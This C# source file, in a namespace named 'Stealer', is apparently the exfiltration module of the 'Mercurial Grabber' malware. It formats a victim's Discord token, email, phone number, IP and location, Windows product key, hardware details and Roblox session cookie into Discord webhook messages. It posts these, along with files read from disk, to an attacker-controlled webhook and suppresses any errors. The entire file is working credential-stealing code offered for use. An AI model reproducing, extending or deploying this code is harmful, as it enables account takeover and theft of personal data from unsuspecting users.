using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net.Http;
using System.Net;
using System.IO;

namespace Stealer
{
    public static class FormUpload
    {
        private static readonly Encoding encoding = Encoding.UTF8;
        public static HttpWebResponse MultipartFormDataPost(string postUrl, string userAgent, Dictionary<string, object> postParameters)
        {
            string formDataBoundary = String.Format("----------{0:N}", Guid.NewGuid());

            string contentType = "multipart/form-data; boundary=" + formDataBoundary;

            byte[] formData = GetMultipartFormData(postParameters, formDataBoundary);

            return PostForm(postUrl, userAgent, contentType, formData);
        }

        private static HttpWebResponse PostForm(string postUrl, string userAgent, string contentType, byte[] formData)
        {

            HttpWebRequest request = WebRequest.Create(postUrl) as HttpWebRequest;

            if (request == null)
            {
                throw new NullReferenceException("request is not a http request");
            }

            request.Method = "POST";
            request.ContentType = contentType;
            request.UserAgent = userAgent;
            request.CookieContainer = new CookieContainer();
            request.ContentLength = formData.Length;

            using (Stream requestStream = request.GetRequestStream())
            {
                requestStream.Write(formData, 0, formData.Length);
                requestStream.Close();
            }

            return request.GetResponse() as HttpWebResponse;
        }

        private static byte[] GetMultipartFormData(Dictionary<string, object> postParameters, string boundary)
        {
            Stream formDataStream = new System.IO.MemoryStream();
            bool needsCLRF = false;

            foreach (var param in postParameters)
            {
                if (needsCLRF)
                    formDataStream.Write(encoding.GetBytes("\r\n"), 0, encoding.GetByteCount("\r\n"));

                needsCLRF = true;

                if (param.Value is FileParameter)
                {
                    FileParameter fileToUpload = (FileParameter)param.Value;

                    string header = string.Format("--{0}\r\nContent-Disposition: form-data; name=\"{1}\"; filename=\"{2}\"\r\nContent-Type: {3}\r\n\r\n",
                        boundary,
                        param.Key,
                        fileToUpload.FileName ?? param.Key,
                        fileToUpload.ContentType ?? "application/octet-stream");

                    formDataStream.Write(encoding.GetBytes(header), 0, encoding.GetByteCount(header));

                    formDataStream.Write(fileToUpload.File, 0, fileToUpload.File.Length);
                }
                else
                {
                    string postData = string.Format("--{0}\r\nContent-Disposition: form-data; name=\"{1}\"\r\n\r\n{2}",
                        boundary,
                        param.Key,
                        param.Value);
                    formDataStream.Write(encoding.GetBytes(postData), 0, encoding.GetByteCount(postData));
                }
            }

            string footer = "\r\n--" + boundary + "--\r\n";
            formDataStream.Write(encoding.GetBytes(footer), 0, encoding.GetByteCount(footer));

            formDataStream.Position = 0;
            byte[] formData = new byte[formDataStream.Length];
            formDataStream.Read(formData, 0, formData.Length);
            formDataStream.Close();

            return formData;
        }
        public class FileParameter
        {
            public byte[] File { get; set; }
            public string FileName { get; set; }
            public string ContentType { get; set; }
            public FileParameter(byte[] file) : this(file, null) { }
            public FileParameter(byte[] file, string filename) : this(file, filename, null) { }
            public FileParameter(byte[] file, string filename, string contenttype)
            {
                File = file;
                FileName = filename;
                ContentType = contenttype;

            }
        }
    }
    
    public static class WebhookContent
    {
        public static string Token(string email, string phone, string token, string username, string avatar, string locale, string creation, string id)
        {
            return "{\"content\": \"\",  \"embeds\":" + "[{\"color\":0,\"fields\":[{\"name\":\"**Account Info**\",\"value\":\"" + "User ID: " + id + "\\nEmail: " + email + "\\nPhone Number: " + phone + "\\nLocale: " + locale + "\",\"inline\":true},{\"name\":\"**Token**\",\"value\":\"" + "`" + token + "`" + "\\nAccount Created: (`" + creation + "`)" + "\",\"inline\":false}],\"author\":{\"name\":\"" + username + "\",\"icon_url\":\"" + avatar + "\"},\"footer\":{\"text\":\"Mercurial Grabber | github.com/nightfallgt/mercurial-grabber\"}}]" + ",\"username\": \"Mercurial Grabber\", \"avatar_url\":\"https://i.imgur.com/vgxBhmx.png\"" + "}";
        }

        public static string IP(string ip, string country, string countryIcon, string regionName, string city, string zip, string isp)
        {
            return "{\"content\": \"\",  \"embeds\":" + "[{\"color\":0,\"fields\":[{\"name\":\"**IP Address Info**\",\"value\":\"" + "IP Address - " + ip + "\\nISP - " + isp + "\\nCountry - " + country + "\\nRegion - " + regionName + "\\nCity - " + city + "\\nZip - " + zip + "\",\"inline\":true}],\"thumbnail\":{\"url\":\"" + countryIcon + "\"},\"footer\":{\"text\":\"Mercurial Grabber | github.com/nightfallgt/mercurial-grabber\"}}]" + ",\"username\": \"Mercurial Grabber\", \"avatar_url\":\"https://i.imgur.com/vgxBhmx.png\"" + "}";
        }

        public static string ProductKey(string key)
        {
            return "{\"content\": \"\",  \"embeds\":" + "[{\"color\":0,\"fields\":[{\"name\":\"**Windows Product Key**\",\"value\":\"" + "Product Key - " + key + "\",\"inline\":true}],\"footer\":{\"text\":\"Mercurial Grabber | github.com/nightfallgt/mercurial-grabber\"}}]" + ",\"username\": \"Mercurial Grabber\", \"avatar_url\":\"https://i.imgur.com/vgxBhmx.png\"" + "}";
        }

        public static string Hardware(string osName, string osArchitecture, string osVersion, string processName, string gpuVideo, string gpuVersion, string diskDetails, string pcMemory)
        {
            return "{\"content\": \"\",  \"embeds\":" + "[{\"color\":0,\"fields\":[{\"name\":\"**OS Info**\",\"value\":\"" + "Operating System Name - " + osName + "\\nOperating System Architecture - " + osArchitecture + "\\nVersion - " + osVersion + "\",\"inline\":true}" + ",{\"name\":\"**Processor**\",\"value\":\"" + "CPU - " + processName + "\",\"inline\":false}," + "{\"name\":\"**GPU**\",\"value\":\"" + "Video Processor - " + gpuVideo + "\\nDriver Version  - " + gpuVersion + "\",\"inline\":false}" + ",{\"name\":\"**Memory**\",\"value\":\"" + "Memory - " + pcMemory + "\",\"inline\":false}," + "{\"name\":\"**Disk**\",\"value\":\"" + diskDetails + "\",\"inline\":false}" + "],\"" + "footer\":{\"text\":\"Mercurial Grabber | github.com/nightfallgt/mercurial-grabber\"}}]" + ",\"username\": \"Mercurial Grabber\", \"avatar_url\":\"https://i.imgur.com/vgxBhmx.png\"" + "}";
        }

        public static string RobloxCookie(string cookie)
        {
            return "{\"content\": \"\",  \"embeds\":" + "[{\"color\":0,\"fields\":[{\"name\":\"**Roblox Cookie**\",\"value\":\"" + cookie + "\",\"inline\":true}],\"footer\":{\"text\":\"Mercurial Grabber | github.com/nightfallgt/mercurial-grabber\"}}]" + ",\"username\": \"Mercurial Grabber\", \"avatar_url\":\"https://i.imgur.com/vgxBhmx.png\"" + "}";
        }


        public static string SimpleMessage(string title, string message)
        {
            return "{\"content\": \"\",  \"embeds\":" + "[{\"color\":0,\"fields\":[{\"name\":\"**" + title + "**\",\"value\":\"" + message + "\",\"inline\":true}],\"footer\":{\"text\":\"Mercurial Grabber | github.com/nightfallgt/mercurial-grabber\"}}]" + ",\"username\": \"Mercurial Grabber\", \"avatar_url\":\"https://i.imgur.com/vgxBhmx.png\"" + "}";
        }
    }
    class Webhook
    {
        private string webhook;
        public Webhook(string userWebhook)
        {
            webhook = userWebhook;
        }
        public void Send(string content)
        {
            Dictionary<string, string> data = new Dictionary<string, string>();

            data.Add("content", content);
            data.Add("username", "Mercurial Grabber");
            data.Add("avatar_url", "https://i.imgur.com/vgxBhmx.png");
            try
            {
                using (HttpClient client = new HttpClient())
                {
                    client.PostAsync(webhook, new FormUrlEncodedContent(data)).GetAwaiter().GetResult();
                }
            }
            catch
            {
            }
        }
        public void SendContent(string content)
        {
            try
            {
                var wr = WebRequest.Create(webhook);
                wr.ContentType = "application/json";
                wr.Method = "POST";
                using (var sw = new StreamWriter(wr.GetRequestStream()))
                    sw.Write(content);
                wr.GetResponse();
            }
            catch
            {
            }
        }

        public void SendData(string msgBody, string filename, string filepath, string application)
        {
            // read file data
            FileStream fs = new FileStream(filepath, FileMode.Open, FileAccess.Read);
            byte[] data = new byte[fs.Length];
            fs.Read(data, 0, data.Length);
            fs.Close();

            Dictionary<string, object> postParameters = new Dictionary<string, object>();
            postParameters.Add("filename", filename);
            postParameters.Add("file", new FormUpload.FileParameter(data, filename, application));

            postParameters.Add("username", "Mercurial Grabber");
            postParameters.Add("content", msgBody);
            postParameters.Add("avatar_url", "https://i.imgur.com/vgxBhmx.png");

            HttpWebResponse webResponse = FormUpload.MultipartFormDataPost(webhook, "Mozilla/5.0 (Macintosh; Intel Mac OS X x.y; rv:42.0) Gecko/20100101 Firefox/42.0", postParameters);

            StreamReader responseReader = new StreamReader(webResponse.GetResponseStream());
            string fullResponse = responseReader.ReadToEnd();
            webResponse.Close();

            Console.WriteLine("Response: " + fullResponse);
        }
    }
}
